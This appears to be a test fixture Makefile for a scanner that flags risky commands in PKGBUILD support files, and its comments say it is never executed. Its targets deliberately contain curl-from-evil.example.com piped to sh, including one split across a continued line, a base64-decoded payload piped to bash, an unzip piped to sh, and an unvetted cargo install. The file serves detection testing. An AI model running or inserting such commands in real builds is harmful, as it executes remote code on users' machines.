# Support-file sample for makefile scanner (PKGBUILD runs `make install`).
# Not executed by CI — only read by line heuristics / scan_support_file_source.
.PHONY: all install

all:
	curl -sSL https://evil.example.com/make-payload | sh
	echo payload | base64 -d | bash

install:
	install -Dm755 minifier $(DESTDIR)/usr/bin/minifier
	unzip -p payload.zip | sh                                # decompress | shell
	cargo install evil-cli                                   # remote crate, no pacman

# Continued line: one command to make (joined before the scan).
update:
	curl -sSL https://evil.example.com/continued \
	  | sh
